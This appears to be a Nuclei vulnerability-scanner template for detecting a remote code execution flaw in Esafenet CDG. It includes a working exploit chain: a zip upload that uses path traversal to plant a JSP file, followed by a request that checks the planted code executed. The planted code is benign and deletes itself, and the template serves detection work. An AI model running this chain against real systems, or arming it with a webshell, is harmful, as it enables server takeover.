id: esafenet-cdg-rce
info:
  name: 亿赛通 CDG - 远程代码执行漏洞
  author: kun.fang
  severity: critical
  description: |
    该模板用于检测 亿赛通 CDG - 远程代码执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/CDGServer3/hiddenWatermark/uploadFile`、`/CDGServer3/js/{变量}.jsp` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-1056284
    vendor: esafenet
    product: cdg
  tags: rce,vuln,esafenet
variables:
  randomFileName: '{{to_lower(rand_text_alpha(8))}}'
  randomContent: '{{to_lower(rand_text_alpha(8))}}'
  rboundary: '{{to_lower(rand_text_alpha(8))}}'
  fname: '{{concat("../../../js/", randomFileName, ".jsp")}}'
  filecontent: '{{concat("<% out.print(\"", randomContent, "\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}'
  payload: '{{zip(fname, filecontent)}}'
flow: http(1) && http(2)
http:
- method: POST
  path:
  - '{{BaseURL}}/CDGServer3/hiddenWatermark/uploadFile'
  redirects: false
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
  body: |
    ------WebKitFormBoundary{{rboundary}}
    Content-Disposition: form-data; name="doc"; filename="{{randomFileName}}.zip"
    Content-Type: application/zip

    {{payload}}
    ------WebKitFormBoundary{{rboundary}}--
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200'
- method: GET
  path:
  - '{{BaseURL}}/CDGServer3/js/{{randomFileName}}.jsp'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200 && contains(body, randomContent)'
